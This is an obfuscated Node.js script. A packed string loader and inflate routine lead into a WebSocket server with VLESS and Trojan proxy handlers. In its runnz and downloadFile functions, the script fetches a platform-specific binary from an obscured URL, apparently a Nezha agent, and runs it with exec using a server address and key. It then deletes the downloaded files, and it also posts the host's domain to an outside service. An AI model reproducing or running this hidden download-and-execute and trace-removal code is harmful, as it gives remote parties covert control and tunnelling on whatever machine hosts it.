(function(f){var I,v,w,s;function l(e,c){return e<<c}function F(e,c){return e>>c}function T(e,c){return e<=c}function B(e,c){return e%c}function J(e,c){return e*c}function e(e,c){return e+c}function V(e,c){return e-c}function U(e,c){return e/c}function Y(e,c){return e<c}function k(e,c){return e>c}function d(e,c){return e>=c}function O(e,c,T){return e[c]=T,e}w=O;const L=(()=>w(w(w(w(w(w({},'D','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'),'L','fromCharCode'),'n','obje'),'f','ct'),'v',!0),'s','length'))();v=Object.assign;s=JSON.parse;let b=[L.D],E,Z=String[L.L],r=Uint8Array,y=Uint16Array,Q=Uint32Array;I=typeof window==='object'&&window||typeof self==='object'&&self||exports||typeof globalThis==='object'&&globalThis||typeof global===e(L.n,'ct')&&global;let c=(function(T){var Q,V,L,b,c;((((c=O)||'1')&&(L='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')||6)&&(V=function(B){var c,L,Z;let T=['th','At'];for(((c={})&&0||(Z=0))&&0||(L=B[e('leng',T[0])]);Y(Z,L);Z++)c[B[e('char',T[1])](Z)]=Z;return c}(L))&&0||(b=function(b){var s,T,y,L;const Q=c(c(c(c(c(c(c(c(c(c(c(c({},'D','length'),'L',4),'n',0),'f',18),'v','char'),'s',1),'Z',12),'x',2),'_',6),'z',3),'w','charAt'),'C',255);return(T=b[Q.D])&&0||(y=B(T,Q.L),s=(k(T,Q.n)?l(V[b.charAt(0)],Q.f):Q.n)|(k(T,1)?l(V[b[e(Q.v,'At')](Q.s)],Q.Z):Q.n)|(k(T,Q.x)?l(V[b.charAt(Q.x)],Q._):Q.n)|(k(T,Q.z)?V[b[Q.w](Q.z)]:Q.n),L=[Z(s>>>16),Z(s>>>8&Q.C),Z(s&Q.C)],L.length-=[Q.n,0,2,1][y],L.join(''))})||8)&&(Q=function(e){return e.replace(/\S{1,4}/g,b)})&&null||c(T,'atob',function(e){const T=c({},'D','');return Q(String(e).replace(/[^A-Za-z0-9\+\/]/g,T.D))})}(I),function(z){var R,L,$,A,n,P,H,a,j,b,h,f,v,W,M,X,i,m,u,S,D,G,x,t,c;const s='p|K|type|I|J|length|d'.split('|');((m=8)||'1')&&(x=!0)&&0||(L=void 0);function C(e){throw e}function N(Z,Q){var V,L,T,c;c=O;const b=(()=>c(c(c(c(c(c({},'D',0),'L','index'),'n','verify'),'f','c'),'v','od'),'s','resize'))();T=this;(L=void 0,c(c(T,'input',Z),'c',b.D),Q||!(Q={}))&&((Q.index&&(T.c=Q[b.L])||'0')&&(Q[b.n]&&(T.N=Q[e('veri','fy')])));((V=Z[T[b.f]++])||'1')&&(L=Z[T.c++]);switch(V&15){case m:T[e('meth',b.v)]=m}(b.D!==B(e(l(V,8),L),31)&&C(Error(e('err:',B(e(l(V,8),L),31))))&&0||L&32&&C(Error('not'))||1)&&c(T,'B',new q(Z,c(c(c(c({},'index',T[b.f]),'bufferSize',Q.bufferSize),'bufferType',Q.bufferType),b.s,Q[e('resi','ze')])))}((D=(N[e('proto','type')][s[0]]=function(){var T,Z,V,L,e;e=O;function B(){return e(e(e(e(e(e(e(e(e({},'D',0),'L','p'),'n','B'),'f','N'),'v',24),'s','c'),'Z',16),'x',8),'_','i32c')}const c=B();return((Z=this)||8)&&(T=Z.input)&&0||(V=void 0,L=void c.D,V=Z[c.n][c.L](),e(Z,'c',Z.B.c),Z[c.f]&&(L=(l(T[Z.c++],c.v)|l(T[Z[c.s]++],c.Z)|l(T[Z.c++],c.x)|T[Z[c.s]++])>>>0,L!==jb(V)&&C(Error(c._))),V)},0))||4)&&(h=1);function q(B,V){var Z,c;c=O;function L(){return['l','m','e','c','index','bufferSize','bufferType','C',32768,'a','b','I','o','n']}let T=L();Z=this;(c(c(c(c(c(c(c(Z,T[0],[]),T[1],32768),T[2],Z.g=Z[T[3]]=Z.q=0),'input',u?new r(B):B),'s',!1),'n',h),'C',!1),V||!(V={}))&&(((V.index&&(Z[T[3]]=V[T[4]])||3)&&(V[T[5]]&&(Z.m=V[T[5]]))&&0||V[T[6]]&&(Z.n=V[T[6]]))&&0||V.resize&&(Z[T[7]]=V[e('resi','ze')]));switch(Z[T[13]]){case D:Z.b=T[8];Z[T[9]]=new(u?r:Array)(e(e(32768,Z.m),258));break;case h:Z[T[10]]=0;Z[T[9]]=new(u?r:Array)(Z.m);Z.f=Z.K;Z.t=Z[T[11]];Z[T[12]]=Z.J;break;default:C(Error('imd'))}}((q[e('proto',s[2])][s[1]]=function(b){var s,L,I,Z,B,y,c,T;const Q='c|ut|v|G|length|u'.split('|');return(Z=this)&&0||(B=e(U(Z.input.length,Z[Q[0]]),1)|0,c=void 0,y=void 0,I=void 0,T=Z[e('inp',Q[1])],L=Z.a,b&&('number'===typeof b[Q[2]]&&(B=b[Q[2]]),'number'===typeof b[Q[3]]&&(B+=b[Q[3]])),k(2,B)?(c=U(V(T[Q[4]],Z[Q[0]]),Z[Q[5]][2]),I=J(258,U(c,2))|0,y=Y(I,L[e('leng','th')])?e(L.length,I):l(L[Q[4]],1)):y=J(L.length,B),u?(s=new r(y),s.set(L)):s=L,Z.a=s)})&&false||(q.prototype[s[3]]=function(){var Z,B,T;let c=['th','a','C','ray'];return(T=this)&&0||(B=T.b,u?T[c[2]]?(Z=new r(B),Z.set(T.a[e('subar',c[3])](0,B))):Z=T[c[1]][e('subar','ray')](0,B):(k(T.a[e('leng',c[0])],B)&&(T[c[1]].length=B),Z=T[c[1]]),T.buffer=Z)}))&&0||(q[e('proto',s[2])][s[4]]=function(I,f){var Q,y,w,E,B,r,Z,L,s;L=O;const l=['b','leng',0,'length',8,'e','c'];for(((((Q=this)||true)&&(y=Q.a)&&0||(Z=Q[l[0]])||true)&&L(Q,'u',I)||2)&&(w=y[e(l[1],'th')]);256!==(r=g(Q,I));)if(k(256,r)){(d(Z,w)&&(y=Q.f(),w=y[l[3]])||'0')&&(y[Z++]=r)}else{for((((((B=V(r,257))||3)&&(E=b[B])&&0||Y(0,n[B])&&(E+=o(Q,n[B])))&&0||(r=g(Q,f))||7)&&(s=c[r])&&null||Y(l[2],v[r])&&(s+=o(Q,v[r])))&&null||k(e(Z,E),w)&&(y=Q.f(),w=y[e('leng','th')]);E--;)y[Z]=y[V(Z++,s)]}for(;T(l[4],Q[l[5]]);)Q[l[5]]-=8,Q[l[6]]--;L(Q,'b',Z)});function I(V){var E,p,O,c,r,s,b,v,B,y,f,I,Z;function L(){return'length'.split('|')}let w=L();((s=V[w[0]])&&0||(B=0))&&0||(f=Number[e('POSITIVE_','INFINITY')]);for(v=0;Y(v,s);++v)k(V[v],B)&&(B=V[v]),Y(V[v],f)&&(f=V[v]);for(y=(b=l(1,B),E=new(u?Q:Array)(b),Z=1,O=0,2);T(Z,B);){for(v=0;Y(v,s);++v)if(V[v]===Z){for(p=(I=0,c=O,0);Y(p,Z);++p)I=l(I,1)|c&1,c>>=1;for(p=(r=l(Z,16)|v,I);Y(p,b);p+=y)E[p]=r;++O}((++Z||5)&&(O<<=1)||3)&&(y<<=1)}return[E,B,f]}function g(s,Q){var e,T,L,w,c,b,I,B,Z,y;c=O;function f(){return c(c(c(c(c(c(c(c(c({},'D','input'),'L','length'),'n',0),'f',1),'v',8),'s',16),'Z','g'),'x','e'),'_','c')}const E=f();for((((((Z=s.g)&&0||(y=s.e)||7)&&(T=s[E.D])&&0||(w=s.c)||6)&&(e=T[E.L])||9)&&(L=Q[E.n])||'1')&&(I=Q[E.f]);Y(y,I)&&!d(w,e);)Z|=l(T[w++],y),y+=E.v;return b=L[Z&V(l(E.f,I),E.f)],B=b>>>E.s,c(c(c(s,E.Z,F(Z,B)),E.x,V(y,B)),E._,w),b&65535}function E(Q){var y,E,b,T,Z,c,B,s,V;T=O;const L=(()=>'th|length|call'.split('|'))();function w(s,y,L){var I,b,T,Z,c,B;Z=O;function V(){return Z(Z(Z(Z(Z(Z({},'D',0),'L',3),'n',2),'f',11),'v',7),'s',18)}const Q=V();(B=this)&&0||(c=B.z);for(T=Q.D;Y(T,s);)switch(b=g(B,y),b){case 16:for(I=e(Q.L,o(B,Q.n));I--;)L[T++]=c;break;case 17:for(I=e(3,o(B,Q.L));I--;)L[T++]=0;c=0;break;case Q.s:for(I=e(Q.f,o(B,Q.v));I--;)L[T++]=Q.D;c=0;break;default:c=L[T++]=b}return Z(B,'z',c),L}(((((V=e(o(Q,5),257))&&null||(c=e(o(Q,5),1)))&&0||(y=e(o(Q,4),4)))&&0||(E=new(u?r:Array)(P[e('leng',L[0])])))&&0||(b=void 0))&&0||(s=void 0);for(B=0;Y(B,y);++B)E[P[B]]=o(Q,3);if(!u){for(y=(B=y,E[L[1]]);Y(B,y);++B)E[P[B]]=0}(((Z=I(E))&&null||(b=new(u?r:Array)(V))||4)&&(s=new(u?r:Array)(c))&&0||T(Q,'z',0)||'1')&&Q.o(I(w.call(Q,V,Z,b)),I(w[L[2]](Q,c,Z,s)))}function o(b,y){var I,T,Z,c,L,Q,B;Z=O;const s=Z(Z(Z(Z(Z(Z(Z({},'D','inp'),'L','ut'),'n','c'),'f','leng'),'v','th'),'s',8),'Z',1);for(((((B=b.g)&&false||(c=b.e))&&0||(Q=b[e(s.D,s.L)]))&&0||(I=b[s.n])||3)&&(T=Q[e(s.f,s.v)]);Y(c,y);)d(I,T)&&C(Error('bk')),B|=l(Q[I++],c),c+=s.s;return L=B&V(l(s.Z,y),1),Z(Z(Z(b,'g',B>>>y),'e',V(c,y)),s.n,I),L}((((((M=(q[e('proto','type')][s[0]]=function(){var r,s,v,c,B,f,Z,b,Q,T,y;let I=w(w(w(w(w(w(w(w(w(w(w(w(w(w(w({},'D','s'),'L',3),'n','ut'),'f','length'),'v','e'),'s','g'),'Z',0),'x',1),'_','iL'),'z',8),'w','subarray'),'C','b'),'q','f'),'k','c'),'J','o');for(B=this;!B[I.D];){((y=o(B,I.L))&&0||y&1&&(B[I.D]=x))&&0||(y>>>=1);switch(y){case 0:r=B[e('inp',I.n)];b=B.c;c=B.a;s=B.b;v=r[e('leng','th')];T=L;Q=L;f=c[I.f];Z=L;B[I.v]=B[I.s]=I.Z;d(e(b,I.x),v)&&C(Error(I._));T=r[b++]|l(r[b++],I.z);d(e(b,I.x),v)&&C(Error('iN'));Q=r[b++]|l(r[b++],I.z);T===~Q&&C(Error('ih'));k(e(b,T),r.length)&&C(Error('ib'));switch(B.n){case D:for(;k(e(s,T),c[I.f]);){if(Z=V(f,s),T-=Z,u){(c.set(r[I.w](b,e(b,Z)),s)&&0||(s+=Z)||4)&&(b+=Z)}else{for(;Z--;)c[s++]=r[b++]}(((B[I.C]=s)||'0')&&(c=B[I.q]())||6)&&(s=B.b)}break;case h:for(;k(e(s,T),c[I.f]);)c=B.f(w({},'v',2));break;default:C(Error('im'))}if(u){(c.set(r.subarray(b,e(b,T)),s)&&0||(s+=T)||'1')&&(b+=T)}else{for(;T--;)c[s++]=r[b++]}B[I.k]=b;B[I.C]=s;B.a=c;break;case I.x:B[I.J](a,R);break;case 2:E(B);break;default:C(Error(e('e: ',y)))}}return K(B.t())},'undefined'))||true)&&(u=M!==typeof r&&M!==typeof y&&M!==typeof Q&&M!==typeof DataView)&&0||(P=(X=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],u?new y(X):X))||7)&&(b=(f=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,258,258],u?new y(f):f))||1)&&(n=(j=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0],u?new r(j):j))&&false||(c=($=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],u?new y($):$)))&&0||(v=(W=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],u?new r(W):W))||9)&&(A=new(u?r:Array)(288));for(H=(H=void 0,t=0,A.length);Y(t,H);++t)A[t]=d(143,t)?8:d(255,t)?9:d(279,t)?7:8;(a=I(A))&&0||(G=new(u?r:Array)(30));for(S=(S=void 0,i=0,G[s[5]]);Y(i,S);++i)G[i]=5;R=I(G);function K(B){var y,e,T,V,Q,L;function b(){return w(w(w(w(w(w(w(w(w(w(w({},'D','length'),'L',0),'n',2),'f',3),'v',6),'s',12),'Z',63),'x',13),'_',15),'z',14),'w',4)}const c=b();(((V=void 0)&&0||(e='')||8)&&(V=B[c.D])||6)&&(T=0);while(Y(T,V)){Q=B[T++];switch(F(Q,c.w)){case c.L:case 1:case c.n:case c.f:case 4:case 5:case c.v:case 7:e+=Z(Q);break;case c.s:case c.x:y=B[T++];e+=Z(l(Q&31,c.v)|y&c.Z);break;case c.z:y=B[T++];L=B[T++];e+=Z(l(Q&c._,12)|l(y&c.Z,6)|l(L&c.Z,c.L))}}return e}z[s[6]]=function(c){const Z=w(w({},'D','spl'),'L','p');let T=new N(new r(z.atob(c)[e(Z.D,'it')]('').map(e=>e.charCodeAt(0))),{}),B=T[Z.L]();return B}}(I),E=typeof globalThis===e('obje',L.f)&&globalThis||typeof window===e('obje','ct')&&window||typeof self===e(L.n,'ct')&&self||typeof global===e(L.n,L.f)&&global,L.v);for(let e of b)(e=I.d(e),e=s(e),c)?v(E,e):(E.StringExtract=e)&&0||v(E,e);for(let c=0;Y(c,f[L.s]);c++)E[e('_$a',c)]&&v(E,w({},E[e('_$a',c)],f[c]))}([{IPBRS:28},console.error,encodeURIComponent,['IogZjLVhZ','ZaIipRD','qHcW','Ef',true,87,'hGRgxGUAU'],parseInt,console.log,44]));const os=require(H$7),http=require(O$7),fs=require(X$7),axios=require(V$7),net=require(Q$7),path=require(g$7),crypto=require(F$7),$vAfgXI=require(o$7),Buffer=$vAfgXI[S$7],$vgR2kB=require(s$7),exec=$vgR2kB[B$7],execSync=$vgR2kB[j$7],$vq0m9N=require(u$7),WebSocket=$vq0m9N[E$7],createWebSocketStream=$vq0m9N[t$7],UUID=process[N$7][e$7]||x$7,NEZHA_SERVER=process[N$7][n$7]||'',NEZHA_PORT=process[N$7][d$7]||'',NEZHA_KEY=process[N$7][w$7]||'',DOMAIN=process[N$7][z$7]||q$7,AUTO_ACCESS=process[N$7][R$7]||!0,WSPATH=process[N$7][Z$7]||UUID[_$7](W$7,Y$7),SUB_PATH=process[N$7][i$7]||C$7,NAME=process[N$7][I$7]||r$7,PORT=process[N$7][P$7]||c$7;let ISP='';const GetISP=async()=>{try{const $=await axios.get(h77),A=$[T77];ISP=(A[W77]+c77+A[Y77])[K77](/ /g,'_')}catch($){ISP=k77}};GetISP();const httpServer=http[M77]((A,$)=>{if(A[l77]==='/'){const A=path[V77](__dirname,Q77);fs[g77](A,F77,(A,m)=>{if(A){$[b77](l$7,{[L77]:o77}),$[a77](S77);return}$[b77](l$7,{[L77]:o77}),$[a77](m)});return}else{if(A[l77]===m77+SUB_PATH){const d=v77+UUID+G77+DOMAIN+A77+DOMAIN+J77+DOMAIN+f77+WSPATH+U77+NAME+c77+ISP,o=$77+UUID+G77+DOMAIN+D77+DOMAIN+J77+DOMAIN+f77+WSPATH+U77+NAME+c77+ISP,m=d+'\n'+o,A=Buffer[O77](m)[H77](X77);$[b77](l$7,{[L77]:p77}),$[a77](A+'\n')}else{$[b77](M$7,{[L77]:p77}),$[a77](y77)}}}),wss=new WebSocket[s77]({[B77]:httpServer}),uuid=UUID[K77](/-/g,''),DNS_SERVERS=[j77,u77];function resolveHost($){return new Promise((resolve,reject)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[E77]($)){resolve($);return}let m=W$7;function A(){if(m>=DNS_SERVERS[t77]){reject(new Error(e77+$+N77));return}const d=DNS_SERVERS[m];m++;const o=x77+k$7($)+n77;axios.get(o,{[z77]:m$7,[Z77]:{[R77]:q77}})[w77](m=>{const $=m[T77];if($[_77]===W$7&&$[i77]&&$[i77][t77]>W$7){const A=$[i77][C77]($=>$[I77]===b$7);if(A){resolve(A[T77]);return}}A()})[d77]($=>((A()),void 0))}A()})}function handleVlessConnection(f,$){var y=_$7,B=b$7;const [o]=$,L=$[y](B,p$7);if(!L[r77](($,A)=>$==h$7(uuid[P77](A*L$7,L$7),a$7))){return!1}let V=$[y](p$7,y$7)[ki7]()+v$7;const m=$[y](V,V+=L$7)[hi7](W$7),A=$[y](V,V+=B)[ki7](),d=A==B?$[y](V,V+=A$7)[V77]('.'):A==L$7?new TextDecoder()[Yi7]($[y](V+B,V+=B+$[y](V,V+B)[ki7]())):A==G$7?$[y](V,V+=a$7)[Ki7]((m,A,o,$)=>o%L$7?m[Wi7]($[_$7](o-b$7,o+b$7)):m,[])[Ti7]($=>$[hi7](W$7)[H77](a$7))[V77](':'):'';f[ci7](new Uint8Array([o,W$7]));const J=createWebSocketStream(f);resolveHost(d)[w77](A=>((net[li7]({[mi7]:A,[bi7]:m},function(){this[pi7]($[_$7](V)),J[Mi7](ai7,()=>{})[Li7](this)[Mi7](ai7,()=>{})[Li7](J)})[Mi7](ai7,()=>{})),void 0))[d77](A=>((net[li7]({[mi7]:d,[bi7]:m},function(){this[pi7]($[_$7](V)),J[Mi7](ai7,()=>{})[Li7](this)[Mi7](ai7,()=>{})[Li7](J)})[Mi7](ai7,()=>{})),void 0));return!0}function handleTrojanConnection(o,$){var A=_$7,m=b$7;try{if($[t77]<J$7){return!1}const y=$[A](W$7,f$7)[H77](),d=[UUID];let J=null;for(const $ of d){const A=crypto[Gi7](Ai7)[vi7]($)[yi7](Ji7);if(A===y){J=$;break}}if(!J){return!1}let offset=f$7;if($[offset]===U$7&&$[offset+m]===$$7){offset+=L$7}const j=$[offset];if(j!==m){return!1}offset+=m;const L=$[offset];offset+=m;let f,V;if(L===m){f=$[A](offset,offset+A$7)[V77]('.'),offset+=A$7}else{if(L===G$7){const o=$[offset];offset+=m,f=$[A](offset,offset+o)[H77](),offset+=o}else{if(L===A$7){f=$[A](offset,offset+a$7)[Ki7]((m,A,o,$)=>o%L$7?m[Wi7]($[_$7](o-b$7,o+b$7)):m,[])[Ti7]($=>$[hi7](W$7)[H77](a$7))[V77](':'),offset+=a$7}else{return!1}}}V=$[hi7](offset),offset+=L$7;if(offset<$[t77]&&$[offset]===U$7&&$[offset+m]===$$7){offset+=L$7}const B=createWebSocketStream(o);resolveHost(f)[w77](A=>((net[li7]({[mi7]:A,[bi7]:V},function(){if(offset<$[t77]){this[pi7]($[_$7](offset))}B[Mi7](ai7,()=>{})[Li7](this)[Mi7](ai7,()=>{})[Li7](B)})[Mi7](ai7,()=>{})),void 0))[d77](A=>((net[li7]({[mi7]:f,[bi7]:V},function(){if(offset<$[t77]){this[pi7]($[_$7](offset))}B[Mi7](ai7,()=>{})[Li7](this)[Mi7](ai7,()=>{})[Li7](B)})[Mi7](ai7,()=>{})),void 0));return!0}catch(d){return!1}}wss[Mi7](fi7,($,m)=>{const A=m[l77]||'';$[Ui7]($i7,A=>{if(A[t77]>p$7&&A[W$7]===W$7){const m=A[_$7](b$7,p$7),o=m[r77](($,A)=>$==h$7(uuid[P77](A*L$7,L$7),a$7));if(o){if(!handleVlessConnection($,A)){$[Di7]()}return}}if(!handleTrojanConnection($,A)){$[Di7]()}})[Mi7](ai7,()=>{})});const getDownloadUrl=()=>{const $=os[Hi7]();return $===Oi7||$===Xi7||$===Vi7?!NEZHA_PORT?oi7:Fi7:!NEZHA_PORT?gi7:Qi7},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY){return}try{const m=getDownloadUrl(),$=await axios({[Si7]:'get',[l77]:m,[Bi7]:si7}),A=fs[ji7](ui7);$[T77][Li7](A);return new Promise((resolve,reject)=>((A[Mi7](Ei7,()=>((T$7(ti7)),(exec(ei7,$=>{if($){reject($)}resolve()})),void 0))),(A[Mi7](ai7,reject)),void 0))}catch($){throw $}},runnz=async()=>{try{const status=execSync(Ni7,{[ni7]:xi7});if(status[di7]()!==''){T$7(wi7);return}}catch(A){}await downloadFile();let o='',$=[zi7,qi7,Ri7,Zi7,_i7,ii7];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const A=$[Ii7](NEZHA_PORT)?me7:'';o=be7+NEZHA_SERVER+pe7+NEZHA_PORT+Le7+NEZHA_KEY+ae7+A+ye7}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const m=NEZHA_SERVER[Ii7](':')?NEZHA_SERVER[Pi7](':')[ri7]():'',A=$[Ii7](m)?he7:ke7,o=Te7+NEZHA_KEY+Ke7+NEZHA_SERVER+We7+A+Ye7+UUID;fs[ce7](Me7,o)}o=le7}else{T$7(Ci7);return}}try{exec(o,{[Ae7]:Ge7},$=>{if($){K$7(fe7,$)}else{T$7(Je7)}})}catch(m){K$7(ve7+m)}};async function addAccessTask(){if(!AUTO_ACCESS){return}if(!DOMAIN){return}const $=Ue7+DOMAIN;try{const A=await axios[$e7](De7,{[l77]:$},{[Z77]:{[L77]:He7}});T$7(Oe7)}catch(A){}}const delFiles=()=>((fs[Xe7](ui7,()=>{})),(fs[Xe7](Me7,()=>{})),void 0);httpServer[Ve7](PORT,()=>((runnz()),(setTimeout(()=>((delFiles()),void 0),D$7)),(addAccessTask()),(T$7(Qe7+PORT)),void 0))
